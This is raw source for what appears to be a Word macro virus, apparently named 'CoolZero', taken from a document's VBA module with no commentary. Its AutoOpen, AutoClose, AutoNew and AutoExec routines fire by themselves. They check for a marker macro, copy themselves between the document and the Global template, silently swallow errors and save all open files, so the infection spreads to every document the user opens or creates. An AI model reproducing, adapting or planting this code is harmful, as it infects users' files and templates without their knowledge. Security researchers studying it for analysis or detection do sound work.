   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   On Error GoTo -1: On Error GoTo Finish

   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "CoolZero" Then
       VInstalled = 1
   End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec"
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
       WordBasic.MacroCopy "Global:CoolZero", WordBasic.[FileName$]() + "CoolZero"
       WordBasic.FileSaveAll 1, 0
   End If

   Finish:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   On Error GoTo -1: On Error GoTo Finish2

   For i = 1 To WordBasic.CountMacros(0, 0)
       If WordBasic.[MacroName$](i, 0, 0) = "CoolZero" Then
       VInstalled = 1
   End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":CoolZero", "Global:CoolZero"
   End If

   Finish2:
   On Error GoTo -1: On Error GoTo Finish

   For i = 1 To WordBasic.CountMacros(1, 0)
           If WordBasic.[MacroName$](i, 1, 1) = "CoolZero" Then
           VInstalled = 1
   End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec"
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
       WordBasic.MacroCopy "Global:CoolZero", WordBasic.[FileName$]() + ":CoolZero"
       WordBasic.FileSaveAll 1, 0
   End If

   Finish:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   WordBasic.Call "AutoOpen"
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   On Error GoTo -1: On Error GoTo Finish

   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "CoolZero" Then
       VInstalled = 1
   End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec"
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
       WordBasic.MacroCopy "Global:CoolZero", WordBasic.[FileName$]() + ":CoolZero"
       WordBasic.FileSaveAll 1, 0
   End If

   Finish:
   End Sub
